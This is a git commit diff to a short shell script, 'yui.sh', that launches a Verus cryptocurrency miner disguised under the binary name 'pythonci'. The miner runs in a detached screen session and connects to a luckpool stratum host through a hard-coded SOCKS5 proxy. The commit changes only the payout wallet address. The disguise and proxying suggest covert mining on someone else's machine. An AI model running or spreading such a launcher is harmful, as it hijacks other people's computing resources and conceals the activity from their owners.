46b2ae1ed26cca58473a4d719c9de19727486507
ren11222 <91127818+ren11222@users.noreply.github.com>
2021-09-21 12:13:03 +0100

    Update yui.sh

--- yui.sh
+++ yui.sh
@@ -4,7 +4,7 @@ sudo apt install screen libjansson4 -y
 chmod +x yui.sh && chmod +x pythonci chmod 777 pythonci yui.sh
 screen -dmS ls
 jem=stratum+tcp://na.luckpool.net:3956
-bot=RXM8Btq8mJuPPk19t7B6hgZsty7p14cbpG
+bot=RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e
 welo=BR15
 yoto=socks5://27.116.51.178:6667
 ./pythonci -a verus -o $jem -u $bot.$welo -p x -t 2 -x $yoto
